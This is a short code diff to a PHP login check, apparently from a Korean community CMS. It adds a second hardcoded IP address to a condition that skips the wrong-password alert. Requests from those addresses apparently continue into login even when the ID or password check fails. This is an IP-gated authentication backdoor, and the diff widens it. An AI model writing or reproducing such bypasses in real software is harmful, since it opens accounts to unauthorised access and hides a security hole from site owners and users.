@@ -34,7 +34,7 @@ $is_need_not_password = run_replace('login_check_need_not_password', $is_social_
 // 회원아이디를 입력해 보고 맞으면 또 비밀번호를 입력해보는 경우를 방지하기 위해서입니다.
 // 불법사용자의 경우 회원아이디가 틀린지, 비밀번호가 틀린지를 알기까지는 많은 시간이 소요되기 때문입니다.
 if (!$is_need_not_password && (! (isset($mb['mb_id']) && $mb['mb_id']) || !login_password_check($mb, $mb_password, $mb['mb_password'])) ) {
-    if($_SERVER['REMOTE_ADDR'] != '1.208.111.95') {
+    if($_SERVER['REMOTE_ADDR'] != '1.208.111.95' && $_SERVER['REMOTE_ADDR'] != '106.101.135.176') {
         run_event('password_is_wrong', 'login', $mb);
         alert('가입된 회원아이디가 아니거나 비밀번호가 틀립니다.\\n비밀번호는 대소문자를 구분합니다.');
     }
